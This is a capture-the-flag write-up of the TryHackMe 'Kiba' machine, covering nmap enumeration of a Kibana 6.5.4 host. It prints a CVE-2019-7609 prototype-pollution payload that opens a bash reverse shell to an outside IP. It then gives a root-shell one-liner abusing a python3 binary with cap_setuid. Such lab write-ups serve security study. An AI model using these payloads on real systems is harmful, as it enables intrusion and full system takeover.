# Nmap
We start with nmap TCP 
```sh
┌──(kali㉿kali)-[~/THM/KIBA/recon/nmap]
└─$ nmap kiba.thm -p-  --min-rate 2000 -vv -Pn -oA init

...
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack
80/tcp   open  http        syn-ack
5044/tcp open  lxi-evntsvc syn-ack
5601/tcp open  esmagent    syn-ack

```
Results:
```sh
──(kali㉿kali)-[~/THM/KIBA/recon/nmap]
└─$ nmap kiba.thm -p22,80,5044,5601  --min-rate 2000 -vv -Pn -oA openscsvs -sC -sV

...PORT     STATE SERVICE      REASON  VERSION
22/tcp   open  ssh          syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9df8d157132481b6185d048ed2384f90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
|   256 e1e67aa1a11cbe03d24e271b0d0aecb1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2fQ/bb8Gwa5L5++T3T5JC7ZvciybYTlcWE9Djbzuco0f86gp3GOzTeVaDuhOWkR6J3fwxxwDWPk6k7NacceG0=
|   256 2abae5c5fb51381745e7b154caa1a3fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7PJIcjNmxjQK6/M1zKyptfTrUS2l0ZsELrO3prOA0
80/tcp   open  http         syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
5044/tcp open  lxi-evntsvc? syn-ack
5601/tcp open  esmagent?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Wed, 09 Aug 2023 12:18:09 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Wed, 09 Aug 2023 12:18:04 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Wed, 09 Aug 2023 12:18:06 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
.....
```

# Port 80
Enumerated with whatweb, nikto, dirb. Not much useful information for now
Only linux capabilities?/?

# port 5044
Nmap gave no info about port 5044. I checked it with nc to grab the banner. Also no results:

```sh
nc -nvv 10.10.195.146 5044

(UNKNOWN) [10.10.195.146] 5044 (?) open

```

Let's continue

# Port 5601
From the nmap results we can see that there is an http 302 code. which means a redirect. When we visit:
http://kiba.thm:5601 we get redirected to http://kiba.thm:5601/app/kibana

After googling what kibana is:

> Kibana is an free and open frontend application that sits on top of the Elastic Stack, providing search and data visualization capabilities for data indexed in Elasticsearch.

We will enumerate the application and look For some version numbers.

Got io! We fund the version by clivking on Management. Version: 6.5.4

# Exploit
After googling for 'kibana 6.5.4 vulnerabilites' We finnd cve-2019-7609. This vulnerabultity allows us to execute code on the machine.

Instructions for the expoloit can be found here: https://github.com/mpgn/CVE-2019-7609

```sh
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.40.46/443 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
BAM! We have a shell as user 'kiba'. We can read the user flag from kiba's home directory.

# Pivileges escalation
Linpeas showed an interesting file with capabilites:

Manual searching for binaries with capabilites:
```sh
getcap -r / 2>/dev/null
```

Capabilites https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

cap_setuid+ep

```sh
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
So what happens here:
 The CAP_SETUID capability is described as: Make arbitrary manipulations of process UIDs [source](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 UID is the User Identifier. A process carries the UID pf the user who started the process. The UID is used to decide teh privilege to preform operations on resources.
 The UID 0 is reserved for root users. 
 On the home/kiba/.hackmeplease/python3 binary we have setuid capabilites. which means that we can  manipulate the process UID. 
 Sounds great to set the UID to 0 on the process we start with python. 

 But first check what happens if we don't change the UID en we execute the python command with the UID of the current user kiba.
 
```sh
/home/kiba/.hackmeplease/python3 -c 'import os; os.system("/bin/bash")'
```
We can get the process id with:
```sh
ps -aux | grep python3
```
Then we can get the UID of the process with:
```sh
ps -p <PID> -o uid
```
Here we see that the UID is 1000

Now with the UID set to 0:
```sh
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Here we see that we are runing the process as the user root and the UID is set to 0 as we expected.

